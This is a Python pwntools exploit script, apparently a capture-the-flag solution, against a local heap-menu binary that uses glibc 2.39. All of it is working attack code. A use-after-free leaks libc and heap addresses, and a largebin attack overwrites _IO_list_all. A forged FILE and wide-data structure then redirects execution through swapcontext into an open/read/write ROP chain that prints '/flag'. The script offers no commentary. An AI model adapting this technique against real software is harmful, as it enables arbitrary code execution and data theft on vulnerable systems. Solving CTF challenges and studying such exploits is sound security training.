from pwn import *
#context.log_level='debug'
context.arch='amd64'
def add_c(index,size):
	r.recvuntil(b">")
	r.sendline(b"1")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Size: ")
	r.sendline(str(size))	
	return
def show_c(index):
	r.recvuntil(b">")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	return
def del_c(index):
	r.recvuntil(b">")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	return

def edit_c(index,content):
	r.recvuntil(b">")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	r.send(content)	
	return

r=process("./vuln")
pause()
add_c(0,0x500)
add_c(1,0x500)
add_c(2,0x500)
add_c(3,0x500)
del_c(2)
show_c(2)
libc_base=u64(r.recv(6).ljust(8,b"\x00"))-0x203B20
print(hex(libc_base))
del_c(0)
show_c(0)
heap_start=u64(r.recv(6).ljust(8,b"\x00"))-0xCB0
print(hex(heap_start))
del_c(1)
del_c(3)

add_c(0,0x500)
add_c(1,0x510)
add_c(2,0x510)
add_c(3,0x510)
add_c(4,0x510)
add_c(5,0x900)
add_c(6,0x900)
add_c(7,0x510)

del_c(5)

del_c(6)


del_c(2)

add_c(8,0x650)


libc=ELF("./libc-2.39.so")
iolistall_add=libc_base+libc.sym["_IO_list_all"]
edit_c(2,p64(0)*3+p64(iolistall_add-0x20))
IO_wfile_jumps=libc.sym["_IO_wfile_jumps"]+libc_base

del_c(0)
add_c(9,0x650)

print(hex(iolistall_add))

chunk0_add=heap_start+0x290
wide_data_add=chunk0_add+0x520
add_1=wide_data_add+0x88

rdi_add=0x10f75b+libc_base
rsi_add=0x110a4d+libc_base
rdx_add=0x9819d+libc_base #pop rdx; lea; ret;
ret_add=0x1296c5+libc_base
rsp_add=0x3c058+libc_base
rbp_add=0x28a91+libc_base
binsh_add=next(libc.search(b"/bin/sh"))+libc_base
sys_add=libc.sym["system"]+libc_base
svcudp_reply=0x17923D+libc_base
swapcontext=0x5814D+libc_base



fake_file = p64(0)*3+p64(1)
fake_file = fake_file.ljust(0x38,b'\x00')+p64(add_1)
fake_file = fake_file.ljust(0x78,b'\x00')+p64(wide_data_add)
fake_file = fake_file.ljust(0x90,b'\x00')+p64(wide_data_add)
fake_file = fake_file.ljust(0xc8,b'\x00')+p64(IO_wfile_jumps)
edit_c(0,fake_file)

rop_add=chunk0_add+0x510+0x520+0x10

payload = b''
payload = payload.ljust(0x58,b'\x00')+p64(svcudp_reply)
payload = payload.ljust(0xa0,b'\x00')+p64(wide_data_add+0x120-0x28)
payload = payload.ljust(0xc0,b'\x00')+p64(wide_data_add)+p64(0)*3+p64(wide_data_add-0x10)+p64(0)
payload +=b'\x00'*0x28+p64(wide_data_add)
payload +=p64(swapcontext)
payload = payload.ljust(0x128,b'\x00')+p64(wide_data_add+0x130)+p64(ret_add)+p64(rsp_add)+p64(rop_add)
payload = payload.ljust(0x168,b'\x00')+p64(wide_data_add)
edit_c(1,payload)

open_add=libc.sym["open"]+libc_base
read_add=libc.sym["read"]+libc_base
write_add=libc.sym["write"]+libc_base
rop=p64(rdi_add)+p64(rop_add+0x200)+p64(rsi_add)+p64(0)+p64(open_add)+p64(rdi_add)+p64(3)+p64(rsi_add)+p64(rop_add+0x220)+p64(rbp_add)+p64(rop_add+0x60)+p64(rdx_add)+p64(0x100)+p64(read_add)+p64(rdi_add)+p64(1)+p64(rsi_add)+p64(rop_add+0x220)+p64(rbp_add)+p64(rop_add+0xa8)+p64(rdx_add)+p64(0x100)+p64(write_add)
rop=rop.ljust(0x200,b"\x00")+b"/flag"

edit_c(2,rop)

print(hex(rop_add))
r.interactive()
